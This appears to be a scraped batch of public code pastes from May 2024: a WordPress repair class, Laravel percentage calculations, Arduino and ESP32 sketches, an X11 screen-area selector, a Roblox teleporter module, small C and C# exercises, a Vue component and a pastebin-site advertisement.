            $postIds = \GeminiLabs\SiteReviews\Helpers\Arr::getAs('array', $submitted, 'assigned_posts');
            $postIds = glsr('Modules\Sanitizer')->sanitizePostIds($postIds);
            foreach ($postIds as $postId) {
                $isPublished = 'publish' === get_post_status($postId);
                $values[] = [
                    'rating_id' => (int) $result['rating_id'],
                    'post_id' => (int) $postId,
                    'is_published' => (int) $isPublished,
                ];
            }
        }
        $last = end($results);
        $this->current = $last['rating_id'] ?? 0;
        return $values;
    }

    public function unassigned(): array
    {
        $sql = ""
            SELECT r.ID AS rating_id, pm.meta_value AS submitted
            FROM table|ratings AS r
            INNER JOIN table|postmeta AS pm ON (pm.post_id = r.review_id)
            WHERE 1=1
            AND r.ID > %s
            AND r.ID NOT IN (
                SELECT apt.rating_id
                FROM table|assigned_posts apt
            )
            AND pm.meta_key = '_submitted'
            ORDER BY r.ID
            LIMIT 0, %d
        "";
        return glsr('Database')->dbGetResults(
            glsr('Database\Query')->sql($sql, $this->current, $this->limit),
            ARRAY_A
        );
    }
}

add_action('admin_init', function () {
	$command = new \Glsr_Fix_Assigned_Posts();
	$command->run();	
});
"
ZmMb7PPs,prosentase,nasrulkurniawan,PHP,Saturday 4th of May 2024 10:33:57 AM CDT,"public function hitungTriwulan($perspective, $indikator, $iku, $instansi, $unor, $unitkerja, $tahun, $bulan, $inputnilai)
    {
        $decodedIds = [
            Hashids::decode($perspective)[0] ?? null,
            Hashids::decode($indikator)[0] ?? null,
            Hashids::decode($iku)[0] ?? null,
            Hashids::decode($instansi)[0] ?? null,
            Hashids::decode($unor)[0] ?? null,
            Hashids::decode($unitkerja)[0] ?? null
        ];
        list($iddecodeprs, $iddecodeind, $iddecodeiku, $iddecodei, $iddecodeun, $iddecodeuk) = $decodedIds;

        // #01 - Mapping bulan ke triwulan dan semester
        $bulanTriwulan = [];
        $bulanSemester = [];
        for ($i = 1; $i <= 12; $i += 3) {
            if ($bulan >= sprintf('%02d', $i) && $bulan <= sprintf('%02d', $i + 2)) {
                $bulanTriwulan = [sprintf('%02d', $i), sprintf('%02d', $i + 1), sprintf('%02d', $i + 2)];
                $bulanSemester = ($i <= 6) ? ['01', '02', '03', '04', '05', '06'] : ['07', '08', '09', '10', '11', '12'];
                break;
            }
        }

        $kinerjas = Kinerjaorganisasi::where('mkoperspective_id', $iddecodeprs)
            ->where('mkoindikator_id', $iddecodeind)
            ->where('mkoiku_id', $iddecodeiku)
            ->where('instansi_id', $iddecodei)
            ->where('unor_id', $iddecodeuk)
            ->where('tahun', $tahun)
            ->whereIn('bulan', $bulanTriwulan)
            ->get()
            ->keyBy('bulan');

        $nilaiTriwulan = 0;
        foreach ($bulanTriwulan as $bln) {
            $nilaiBulan = ($bulan == $bln) ? $inputnilai : ($kinerjas->get($bln)->nilai ?? 0);
            $nilaiTriwulan += $nilaiBulan;
        }

        $target = Mkorencanatarget::where([
            ['instansi_id', $iddecodei],
            ['unor_id', $iddecodeun],
            ['unitkerja_id', $iddecodeuk],
            ['mkoperspective_id', $iddecodeprs],
            ['mkoindikator_id', $iddecodeind],
            ['mkoiku_id', $iddecodeiku],
            ['tahun', $tahun]
        ])->first();

        $triwulanTargetField = $target->{""tw"" . ceil(intval($bulan) / 3)};

        $prosentaseTriwulan = ($nilaiTriwulan / $triwulanTargetField) * 100;

        // #02 - Menentukan bulan-bulan untuk perhitungan akumulasi target sampai bulan yang dipilih
        $lastMonthOfSelectedQuarter = end($bulanTriwulan);
        $bulanSampaiTriwulanIni = range(1, intval($lastMonthOfSelectedQuarter));

        // Format bulan menjadi '01', '02', ..., '12'
        $bulanSampaiTriwulanIni = array_map(function($month) {
            return sprintf('%02d', $month);
        }, $bulanSampaiTriwulanIni);

        // Load kinerja dari Januari hingga bulan terakhir di triwulan yang dipilih
        $kinerjasSampaiTriwulanIni = Kinerjaorganisasi::where('mkoperspective_id', $iddecodeprs)
            ->where('mkoindikator_id', $iddecodeind)
            ->where('mkoiku_id', $iddecodeiku)
            ->where('instansi_id', $iddecodei)
            ->where('unor_id', $iddecodeuk)
            ->where('tahun', $tahun)
            ->whereIn('bulan', $bulanSampaiTriwulanIni)
            ->get()
            ->keyBy('bulan');

        // Menghitung nilai total dari Januari hingga bulan terakhir di triwulan yang dipilih
        $nilaiTotalSampaiTriwulanIni = 0;
        foreach ($bulanSampaiTriwulanIni as $bln) {
            $nilTotalSampaiTriwulanIni = ($bulan == $bln) ? $inputnilai : ($kinerjasSampaiTriwulanIni->get($bln)->nilai ?? 0);
            $nilaiTotalSampaiTriwulanIni += $nilTotalSampaiTriwulanIni;
        }

        // Menghitung prosentase target dari Januari hingga bulan terakhir di triwulan yang dipilih
        $triwulanTargetSampaiTriwulanIni = 0;
        for ($i = 1; $i <= ceil(intval($bulan) / 3); $i++) {
            $triwulanTargetSampaiTriwulanIni += $target->{""tw$i""};
        }
        $prosentaseTargetSampaiTriwulanIni = ($nilaiTotalSampaiTriwulanIni / $triwulanTargetSampaiTriwulanIni) * 100;

        // #03 - Menghitung nilai, target dan prosentasi semester
        $semesterIndex = (intval($bulan) <= 6) ? 'sem1' : 'sem2';
        $semesterTarget = floatval($target->{$semesterIndex} ?? 0);
        $nilaiSemester = 0;
        foreach ($bulanSemester as $bln) {
            $nilaiSemester += ($bulan == $bln) ? $inputnilai : ($kinerjas->get($bln)->nilai ?? 0);
        }
        $prosentaseSemester = $semesterTarget ? ($nilaiSemester / $semesterTarget) * 100 : 0; // Menangani pembagian dengan nol

        // #04 - Menghitung nilai, target dan prosentase sampai semester ini

        // Menentukan bulan-bulan untuk perhitungan akumulasi target sampai semester yang dipilih
        $lastMonthOfSelectedSemester = end($bulanSemester);
        $bulanSampaiSemesterIni = range(1, intval($lastMonthOfSelectedSemester));

        // Format bulan menjadi '01', '02', ..., '12'
        $bulanSampaiSemesterIni = array_map(function($month) {
            return sprintf('%02d', $month);
        }, $bulanSampaiSemesterIni);

        // Load kinerja dari Januari hingga bulan terakhir di semester yang dipilih
        $kinerjasSampaiSemesterIni = Kinerjaorganisasi::where('mkoperspective_id', $iddecodeprs)
            ->where('mkoindikator_id', $iddecodeind)
            ->where('mkoiku_id', $iddecodeiku)
            ->where('instansi_id', $iddecodei)
            ->where('unor_id', $iddecodeuk)
            ->where('tahun', $tahun)
            ->whereIn('bulan', $bulanSampaiSemesterIni)
            ->get()
            ->keyBy('bulan');

        // Menghitung nilai total dari Januari hingga bulan terakhir di semester yang dipilih
        $nilaiTotalSampaiSemesterIni = 0;
        foreach ($bulanSampaiSemesterIni as $bln) {
            $nilaiBulanSampaiSemesterIni = ($bulan == $bln) ? $inputnilai : ($kinerjasSampaiSemesterIni->get($bln)->nilai ?? 0);
            $nilaiTotalSampaiSemesterIni += $nilaiBulanSampaiSemesterIni;
        }

        // Menghitung target dan prosentase sampai semester ini
        $semesterTargetField = $target->{$semesterIndex}; // 'sem1' atau 'sem2' tergantung bulan
        $prosentaseTargetSampaiSemesterIni = ($nilaiTotalSampaiSemesterIni / $semesterTargetField) * 100;


        // #05 - Menghitung nilai total tahunan dan prosentase tahunan
        $nilaiTotalTahunan = 0;
        for ($i = 1; $i <= 12; $i++) {
            $bln = sprintf('%02d', $i);
            $nilaiBulan = ($bulan == $bln) ? $inputnilai : ($kinerjas->get($bln)->nilai ?? 0);
            $nilaiTotalTahunan += $nilaiBulan;
        }

        $targetTahunan = floatval($target->tahunan); // Mengambil target tahunan dari database
        $prosentaseTahunan = ($nilaiTotalTahunan / $targetTahunan) * 100; // Menghitung prosentase terhadap target tahunan


        return response()->json([
            'nilaiTriwulan' => $nilaiTriwulan,
            'targetTriwulan' => $triwulanTargetField,
            'targetTriwulanSampaiTriwulanIni' => $triwulanTargetSampaiTriwulanIni,
            'prosentaseTriwulan' => round($prosentaseTriwulan, 2),
            'prosentaseSampaiTriwulanIni' => round($prosentaseTargetSampaiTriwulanIni, 2),
            'nilaiSemester' => $nilaiSemester,
            'targetSemester' => $semesterTarget,
            'prosentaseSemester' => round($prosentaseSemester, 2),
            'nilaiTotalSampaiSemesterIni' => $nilaiTotalSampaiSemesterIni,
            'prosentaseTargetSampaiSemesterIni' => round($prosentaseTargetSampaiSemesterIni, 2),
            'targetTahunan' => $targetTahunan,
            'prosentaseTahunan' => round($prosentaseTahunan, 2)
        ]);
    }"
bihwyU0s,Scrolling Text rev_02,pleasedontcode,Arduino,Saturday 4th of May 2024 10:13:53 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Scrolling Text
	- Source Code compiled for: Arduino Uno
	- Source Code created on: 2024-05-04 15:13:08

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* display my name on the I2C moving from left to */
	/* right and back */
/****** END SYSTEM REQUIREMENTS *****/


/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <LiquidCrystal_I2C.h>  // https://github.com/marcoschwartz/LiquidCrystal_I2C

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t LCD1602I2C_I2C_PIN_SDA_A4 = A4;
const uint8_t LCD1602I2C_I2C_PIN_SCL_A5 = A5;
const uint8_t LCD1602I2C_I2C_SLAVE_ADDRESS = 0x27; // This is the I2C address, not 39

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
LiquidCrystal_I2C lcd(LCD1602I2C_I2C_SLAVE_ADDRESS, 20, 4); // Initialize the LCD object with the correct I2C address, columns, and rows

int position = 0; // Variable to store the position of the displayed text

void setup(void)
{
  // put your setup code here, to run once:
  lcd.init();
  lcd.backlight();
  lcd.setCursor(0, 0);
  lcd.print(""Your Name:""); // Display a label
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  lcd.setCursor(position, 1); // Set the cursor position for displaying name
  lcd.print(""Your Name""); // Display your name

  delay(300); // Delay for smooth movement

  lcd.setCursor(position, 1); // Clear the previous name
  lcd.print(""          ""); // Print spaces to clear the name

  if (position < 14) {
    position++; // Move the text to the right
  } else {
    position = 0; // Reset position to start from the left
  }
}

/* END CODE */"
4Qhfx6pX,Scrolling Text rev_01,pleasedontcode,Arduino,Saturday 4th of May 2024 10:12:52 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Scrolling Text
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-04 15:12:08

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* display my name on the I2C moving from left to */
	/* right and back */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <LiquidCrystal_I2C.h>  // https://github.com/marcoschwartz/LiquidCrystal_I2C

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t LCD1602I2C_I2C_PIN_SDA_A4 = A4;
const uint8_t LCD1602I2C_I2C_PIN_SCL_A5 = A5;
const uint8_t LCD1602I2C_I2C_SLAVE_ADDRESS = 0x27; // This is the I2C address, not 39

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
LiquidCrystal_I2C lcd(LCD1602I2C_I2C_SLAVE_ADDRESS, 20, 4); // Initialize the LCD object with the correct I2C address, columns, and rows

int position = 0; // Variable to store the position of the displayed text

void setup(void)
{
  // put your setup code here, to run once:
  lcd.init();
  lcd.backlight();
  lcd.setCursor(0, 0);
  lcd.print(""Your Name:""); // Display a label
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  lcd.setCursor(position, 1); // Set the cursor position for displaying name
  lcd.print(""Your Name""); // Display your name

  delay(300); // Delay for smooth movement

  lcd.setCursor(position, 1); // Clear the previous name
  lcd.print(""          ""); // Print spaces to clear the name

  if (position < 14) {
    position++; // Move the text to the right
  } else {
    position = 0; // Reset position to start from the left
  }
}

/* END CODE */"
jUWWKZag,C Programming draw Rectangle with mouse coordinates,metalx1000,C,Saturday 4th of May 2024 09:57:58 AM CDT,"#include<stdio.h>
#include<stdlib.h>
#include<X11/Xlib.h>
#include<X11/cursorfont.h>
#include<unistd.h> // added for sleep/usleep

// original from [https://bbs.archlinux.org/viewtopic.php?id=85378 Select a screen area with mouse and return the geometry of this area? / Programming & Scripting / Arch Linux Forums]
// build with (Ubuntu 14.04):
// gcc -Wall xrectsel.c -o xrectsel -lX11

int main(void)
{
  int rx = 0, ry = 0, rw = 0, rh = 0;
  int rect_x = 0, rect_y = 0, rect_w = 0, rect_h = 0;
  int btn_pressed = 0, done = 0;

  XEvent ev;
  Display *disp = XOpenDisplay(NULL);

  if(!disp)
    return EXIT_FAILURE;

  Screen *scr = NULL;
  scr = ScreenOfDisplay(disp, DefaultScreen(disp));

  Window root = 0;
  root = RootWindow(disp, XScreenNumberOfScreen(scr));

  Cursor cursor, cursor2;
  cursor = XCreateFontCursor(disp, XC_left_ptr);
  cursor2 = XCreateFontCursor(disp, XC_lr_angle);

  XGCValues gcval;
  gcval.foreground = XWhitePixel(disp, 0);
  gcval.function = GXxor;
  gcval.background = XBlackPixel(disp, 0);
  gcval.plane_mask = gcval.background ^ gcval.foreground;
  gcval.subwindow_mode = IncludeInferiors;

  GC gc;
  gc = XCreateGC(disp, root,
                 GCFunction | GCForeground | GCBackground | GCSubwindowMode,
                 &gcval);

  /* this XGrab* stuff makes XPending true ? */
  if ((XGrabPointer
    (disp, root, False,
     ButtonMotionMask | ButtonPressMask | ButtonReleaseMask, GrabModeAsync,
     GrabModeAsync, root, cursor, CurrentTime) != GrabSuccess))
    printf(""couldn't grab pointer:"");

  if ((XGrabKeyboard
    (disp, root, False, GrabModeAsync, GrabModeAsync,
     CurrentTime) != GrabSuccess))
    printf(""couldn't grab keyboard:"");

  // see also: http://stackoverflow.com/questions/19659486/xpending-cycle-is-making-cpu-100
  while (!done) {
    //~ while (!done && XPending(disp)) {
    //~ XNextEvent(disp, &ev);
    if (!XPending(disp)) { usleep(1000); continue; } // fixes the 100% CPU hog issue in original code
    if ( (XNextEvent(disp, &ev) >= 0) ) {
      switch (ev.type) {
        case MotionNotify:
          /* this case is purely for drawing rect on screen */
          if (btn_pressed) {
            if (rect_w) {
              /* re-draw the last rect to clear it */
              XDrawRectangle(disp, root, gc, rect_x, rect_y, rect_w, rect_h);
            } else {
              /* Change the cursor to show we're selecting a region */
              XChangeActivePointerGrab(disp,
                                       ButtonMotionMask | ButtonReleaseMask,
                                       cursor2, CurrentTime);
            }
            rect_x = rx;
            rect_y = ry;
            rect_w = ev.xmotion.x - rect_x;
            rect_h = ev.xmotion.y - rect_y;

            if (rect_w < 0) {
              rect_x += rect_w;
              rect_w = 0 - rect_w;
            }
            if (rect_h < 0) {
              rect_y += rect_h;
              rect_h = 0 - rect_h;
            }
            /* draw rectangle */
            XDrawRectangle(disp, root, gc, rect_x, rect_y, rect_w, rect_h);
            XFlush(disp);
          }
          break;
        case ButtonPress:
          btn_pressed = 1;
          rx = ev.xbutton.x;
          ry = ev.xbutton.y;
          break;
        case ButtonRelease:
          done = 1;
          break;
      }
    }
  }
  /* clear the drawn rectangle */
  if (rect_w) {
    XDrawRectangle(disp, root, gc, rect_x, rect_y, rect_w, rect_h);
    XFlush(disp);
  }
  rw = ev.xbutton.x - rx;
  rh = ev.xbutton.y - ry;
  /* cursor moves backwards */
  if (rw < 0) {
    rx += rw;
    rw = 0 - rw;
  }
  if (rh < 0) {
    ry += rh;
    rh = 0 - rh;
  }

  XCloseDisplay(disp);

  printf(""%dx%d+%d+%d\n"",rw,rh,rx,ry);

  return EXIT_SUCCESS;
}
"
eKM7gEab,Minimal prices,Sashaiolh,JSON,Saturday 4th of May 2024 09:49:54 AM CDT,"{
    ""minecraft:stone"": 25,
    ""minecraft:cobblestone"": 1488
}
"
pHvFbgvc,Untitled,_KAGATUN_,C#,Saturday 4th of May 2024 09:12:26 AM CDT,"//В нашей великой стране Арстоцка произошла амнистия!
//Всех людей, заключенных за преступление ""Антиправительственное"", следует исключить из списка заключенных.
//Есть список заключенных, каждый заключенный состоит из полей: ФИО, преступление.
//Вывести список до амнистии и после.

using System;
using System.Collections.Generic;
using System.Linq;

namespace Amnesty
{
    internal class Program
    {
        static void Main(string[] args)
        {
            List<Criminal> criminals = new List<Criminal>
            {
                new Criminal (""Иванов Иван Иванович"", ""Антипровительственное""),
                new Criminal (""Петров Николай Владимирович"", ""Грабеж""),
                new Criminal (""Сергеев Илья Петрович"", ""Убийство""),
                new Criminal (""Соколовский Иван Константинович"", ""Антипровительственное""),
                new Criminal (""Абрамов Александр Валентинович"", ""Убийство""),
                new Criminal (""Воробьев Александр Сергеевич"", ""Грабеж""),
                new Criminal (""Корешков Валерий Степанович"", ""Разбой""),
                new Criminal (""Чечеков Артем Александрович"", ""Антипровительственное""),
                new Criminal (""Крикунов Михаил Евгеньевич"", ""Мошенничество""),
                new Criminal (""Зайцев Юрий Антонович"", ""Мошенничество""),
            };

            Console.WriteLine(""Список преступников до амнистии\n"");

            for (int i = 0; i < criminals.Count; i++)
            {
                criminals[i].ShowInfo();
            }

            Console.WriteLine(""\nСписок преступников после амнистии\n"");

            var wantedCriminals = criminals.Where(criminal => criminal.Crime != ""Антипровительственное"");

            foreach (var criminal in wantedCriminals)
            {
                criminal.ShowInfo();
            }
        }
    }

    class Criminal
    {
        public Criminal(string surnameNamePatronymic, string crime)
        {
            SurnameNamePatronymic = surnameNamePatronymic;
            Crime = crime;
        }

        public string SurnameNamePatronymic { get; private set; }
        public string Crime { get; private set; }

        public void ShowInfo()
        {
            Console.WriteLine($""ФИО: {SurnameNamePatronymic}, Преступление: {Crime}"");
        }
    }
}
"
aY5Gg91D,Dungeon Teleporter,Mr-Nightmare1,Lua,Saturday 4th of May 2024 08:55:26 AM CDT,"local Teleporter = {}
Teleporter.__index = Teleporter

local players = game:GetService(""Players"")
local teleportService = game:GetService(""TeleportService"")
local replicatedStorage = game:GetService(""ReplicatedStorage"")
local runService = game:GetService(""RunService"")

local packages = replicatedStorage.Packages
local warpNetwork = require(packages.Warp)

local leaveButtonNetwork = warpNetwork.Server(""LeaveButton"")

function Teleporter.new(dungeonTeleporter: Model)
	
	local self = setmetatable({_teleporter = dungeonTeleporter}, Teleporter)
	self.__call = function(...)
		return {...}
	end
	self._placeId = game.PlaceId -- test
	self._playersTable = {}
	self._playerLimit = 4 -- default
	self._activeConnections = {}
	self._deathConnections = {}
	self._teleporting = false
	--[[
	self.__newindex = function(newTable, index, value)
		newTable[index] = value
		return
	end
	--]]
	
	self:StartRegister()
	return self
end

function Teleporter:CleanDeathConnections()
	
	for _, connection: RBXScriptConnection in self._deathConnections do
		
		connection:Disconnect()
	end
end

function Teleporter:Teleport(actionText: TextLabel)
	local playerTable = self._playersTable
	local placeId = self._placeId
	
	for i = 5, 0, -1 do

		actionText.Text = ""Teleporting in "" .. i
		if i == 1 then
			
			self:CleanDeathConnections()
			local success, errorMessage = pcall(function()
				
				local code = teleportService:ReserveServer(placeId)
				teleportService:TeleportToPrivateServer(placeId, code, playerTable)
			end)

			if not (success) then
				print(""----- Teleport Error -----"")
				print(errorMessage)
				warn(errorMessage)
				print(""----- Teleport Error -----"")
			end

			task.wait(3)
			self._teleporting = false
		end

		task.wait(1)
	end
end

function Teleporter:Update(actionText: TextLabel)
	
	actionText.Text = #self._playersTable..""/""..self._playerLimit
end

function Teleporter:StartRegister()
	
	local model = self._teleporter
	local teleportingZone = model.TeleportingZone
	local teleportData = teleportingZone.TeleportData.Value
	local aboveUi = teleportingZone.AboveUi
	local frame = aboveUi.Frame
	local actionText = frame.ActionText
	
	-- self._placeId = teleportingZone.PlaceId.Value

	local previousTime = tick()
	local delayEnterTime = .175

	local touchBarrier: UnionOperation = model.TouchBarrier
	self._activeConnections[""Touch""] = touchBarrier.Touched:Connect(function(hit)
		
		local character = hit.Parent
		local player = players:GetPlayerFromCharacter(character)
		if player then
			
			if not (table.find(self._playersTable, player)) then
				
				if self._teleporting == false and tick() - previousTime >= delayEnterTime and not (#self._playersTable >= self._playerLimit) then
					previousTime = tick()
					
					character:PivotTo(teleportingZone:GetPivot())
					table.insert(self._playersTable, player)
					self:Update(actionText)
					
					local humanoid = character.Humanoid
					local deathConnection = ""playerDied""..""_""..player.UserId
					
					leaveButtonNetwork:Fire(true, player)
					
					self._deathConnections[deathConnection] = humanoid.Died:Connect(function()
						
						local found = table.find(self._playersTable, player)
						if found then

							table.remove(self._playersTable, found)
							self._deathConnections[deathConnection]:Disconnect()
							self:Update(actionText)
						end
					end)
					
					local leaveConnection = leaveButtonNetwork:Connect(function(playerThatFired)
						
						if player == playerThatFired then
							
							self._deathConnections[deathConnection]:Disconnect()
							local found = table.find(self._playersTable, player)
							if found then
								table.remove(self._playersTable, found)
							end
							if character then
								
								character:PivotTo(model.Outside:GetPivot())
							end
							
							self:Update(actionText)
						end
					end)
				end
			end
		end
	end)
	
	local check = nil
	self._activeConnections[""Heartbeat""] = runService.Heartbeat:Connect(function(deltaTime)
		
		if not (self._teleporting) then
			
			if #self._playersTable > 0 and not (check) then

				check = tick()
			end
			
			if #self._playersTable <= 0 and check then
				
				check = nil
			end

			if check then
				if tick() - check > 10 then

					check = nil
					self._teleporting = true
					self:Teleport(actionText)
				end
			end
		end
	end)
	
	self._activeConnections[""PlayerRemoving""] = players.PlayerRemoving:Connect(function(player)
		
		local found = table.find(self._playersTable, player)
		if found then
			
			table.remove(self._playersTable, found)
			self:Update(actionText)
		end
	end)
	
	local destroyConnection
	destroyConnection = model.Destroying:Connect(function()
		
		for _, connection: RBXScriptConnection in self._activeConnections do
			
			connection:Disconnect()
			destroyConnection:Disconnect()
		end
	end)
end

return Teleporter
"
CQhNgU4R,Pastebin.ai - #1 pastebin alternative,xxsa,PHP,Saturday 4th of May 2024 08:49:46 AM CDT,"https://pastebin.ai - #1 Pastebin Alternative - its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.x
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
..............
.........................
"
mnJDuZci,Untitled,dllbridge,C,Saturday 4th of May 2024 08:38:04 AM CDT,"
 #include    <stdio.h>
  
 int  main()
 {
     int     number;
     int *p=&number;
     
     
     printf(""%d\n"",      p);
     printf(""%d\n"",&number);     
 }
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

/*
#include    <stdio.h>
#include   <string.h>



char sz[99] = ""SONY"";   
    
void foo(char *p);                                 // Заголовок


////////////////////////////////////////////////////
int main()                                        // 
{
	
	
	printf(""%s\n"", sz);
	
	foo(sz);
	
	printf(""%s\n"", sz);	
}



////////////////////////////////////////////////////
void foo(char *p)                                 // Прототип
{
	
	 int n = strlen(p);
	
//	 printf(""n = %d\n"", n);
	 
	 for(int i = 0; i < n; i++)
	 {
			
		p[i] = p[i]+1;	
	 }
}




*/











/*

#include   <stdio.h>





int n1 = 6,
   *p  = &n1,
   &r  =  n1,
   n2  =  *p;   
    



////////////////////////////////////////////////////
int main()                                        // 
{
	
	
}





*/




















/*


#include   <stdio.h>





int n1 = 6,
    n2 = 1,
    n3;



////////////////////////////////////////////////////
int main()                                        // 
{
 
    n3 = n1 | n2;
    
    printf(""n3 = %d\n"", n3);
}


*/


"
ndubVEhq,RPM Counter by IR and BT on ESP32,DuboisP,C++,Saturday 4th of May 2024 08:29:24 AM CDT,"// RPM counter by IR on ESP32, transmit values to smartphone by bluetooth

#include ""time.h""
#include ""BluetoothSerial.h""

// #include <MovingAveragePlus.h>

#if !defined(CONFIG_BT_ENABLED) || !defined(CONFIG_BLUEDROID_ENABLED)
#error Bluetooth is not enabled! Please run `make menuconfig` to and enable it
#endif

#define MIN_LOOP           16                   // nombre minimal de mesures avant de calculer une moyenne
#define IR_detection_pin   12                   // digital input  

volatile double IR_time;
volatile double IR_last_time = 0;
unsigned long start_time4min, start_time4sec;
unsigned long nLoop = 0;
int NbRPM, prevNbRPM = 0;
int nSec;

BluetoothSerial BT_Serial;                      // declaring second serial port.

// Create an Arithmetic Moving Average object of unsigned int type,
// 10 in size
// MovingAveragePlus<unsigned> Median(16);


// déclarations anticipées de fonctions
word Median_filter(word t);                     // filtre lissage sur 8 mesures comptage-tours
void readBT_Serial();


void IRAM_ATTR onInfraRedD3Event() {

   IR_time = micros() - IR_last_time;
   IR_last_time = micros();
}


void setup() {

   Serial.begin(115200);
   
   //   bool begin(String localName=String(), bool isMaster=false);
   //BT_Serial.begin(9600);         // not existing
   //BT_Serial.setPin(""9753"");      // not existing
   BT_Serial.begin(""Esp32_rpm"");    //Bluetooth device name
   Serial.println(""The device started, now you can pair it with bluetooth!"");     
   
   // initialize IR pins
   pinMode(IR_detection_pin, INPUT_PULLUP);
   attachInterrupt(digitalPinToInterrupt(IR_detection_pin), onInfraRedD3Event, RISING);
   
   start_time4min = start_time4sec = millis();
}


void loop() {
   String msg = """";
   char BT_msg[20];
   unsigned long nDivide;
   unsigned long elapsed_time4min, elapsed_time4sec;

   readBT_Serial();
   
   if (IR_time > 0){
      nDivide = 60 * 1000000.0 / IR_time;
      if ((nLoop < MIN_LOOP) || ((nDivide > NbRPM * 0.75) && (nDivide < NbRPM * 1.25))){
        // Median.push(nDivide);
         NbRPM = Median_filter(nDivide);
         // NbRPM = Median.get();
         nLoop = nLoop < MIN_LOOP ? ++nLoop : nLoop;
      }
   }
   
   elapsed_time4min = elapsed_time4sec = millis();
   nSec = int((elapsed_time4min - start_time4min) / 1000);
   // remise à zéro du comptage sur la minute
   if ((elapsed_time4min - start_time4min) > 60000) {
      start_time4min = elapsed_time4min;
      prevNbRPM = NbRPM;
   }
   // envoi des mesures toutes les secondes vers le périphérique externe ordi ou smartphone
   if ((elapsed_time4sec - start_time4sec) > 1000) {        
      start_time4sec = elapsed_time4sec;
      sprintf(BT_msg, ""%5d,%3d,%5d"", NbRPM, nSec, prevNbRPM);
      BT_Serial.println(BT_msg);
   }
   
   delay(250);
}


void readBT_Serial(){
   String msg = """";

   while (BT_Serial.available()){
      delay(10);
      if(BT_Serial.available() > 0 ) {
         char c = BT_Serial.read();
         msg += c;
      }
      //Serial.println(msg);
      // reset de l'Esp32 si commande reçue
      if (msg == ""RESET""){
         ESP.restart();
      }
   }
}


// 
// Glow Hott pour télémesure Graupner Hott
// 
// Filtrage pour valeur compte-tours
//
// Auteur : www.thyzoon.fr 2015
// 
// modifié à 8 compteurs par Patrick en 2022-01

// Filtre pour compte-tours moteur
// Filtrage median = : tri de 3 valeurs, pris en compte de la valeur mediane.
// Moyenne de 8 valeurs consécutives.
//
word Median_filter(word v) {
 
  byte i,j;
  word mini; 
  word temp;
  
  static word t0=0,t1=0,t2=0;                // Variables de memorisation car le tableau ne peut pas etre static
  word t[3];                                 // tableau utilise pour le tri des valeurs
  static long fi0=1536,fi1=1536,fi2=1536,fi3=1536,fi4=1536,
   fi5=1536, fi6=1536, fi7=1536; // variables du filtre
  long filtre;                               // resultat du filtrage
  
  // Decalage des 3 echantillons (2 memorisées et nouvelle valeur)
  t2 = t1;
  t1 = t0;
  t0 = v;
  
  // Transfert des 3 valeurs dans le tableau pour faire le tri
  t[0] = t0;
  t[1] = t1;
  t[2] = t2;
  
  // Tri des valeurs par ordre croissant 
  for (i=0; i<=1; i++) {
    mini = i;
    for (j=i+1; j<=2; j++) {
      if (t [j] < t [mini])
        mini = j;        
    }
    if (mini != i) { // échange
      temp = t [i];
      t [i] = t [mini];
      t [mini] = temp;
    }  
  }
  
  // Valeur médiane => t[1]
  fi0 = (long) t[1];
  // Moyenne des 8 dernieres valeurs
  filtre = (fi0 + fi1 + fi2 + fi3 + fi4 + fi5 + fi6 + fi7) / 8;
  fi7 = fi6;  // Décalage  
  fi6 = fi5;  // Décalage  
  fi5 = fi4;  // Décalage  
  fi4 = fi3;  // Décalage   
  fi3 = fi2;  // Décalage 
  fi2 = fi1;  // Décalage 
  fi1 = fi0;  // mémorisation valeur mediane
  
  return ((word)filtre); 
}

"
m8H5UHi3,vue,lamhotsimamora,JavaScript,Saturday 4th of May 2024 08:28:27 AM CDT," var app=  new Vue({
        el : ""#app"",
        data : {
            books: null
        },
        methods: {
            loadImage: function(image){
              return 'storage/'+image
            },
            updateData : function(data){
              edit.name = data.name;
              edit.cover = data.cover;
              edit.price = data.price;
              edit.id = data.id;
            },
            loadData: async function(){
              
                try {
                    const response = await axios.get('/books');
                    this.books = response.data;
                } catch (error) {
                     console.error(error);
                }
            },
            deleteData: function(id){
                axios.post('/book-delete', {
                    id: id,
                    _token : _TOKEN_
                })
                .then(function (response) {
                    alert(""success delete data"")
                    window.location.href="".""
                })
                .catch(function (error) {
                    console.log(error);
                });
            }
        },
        mounted() {
            this.loadData();
        },
    })
"
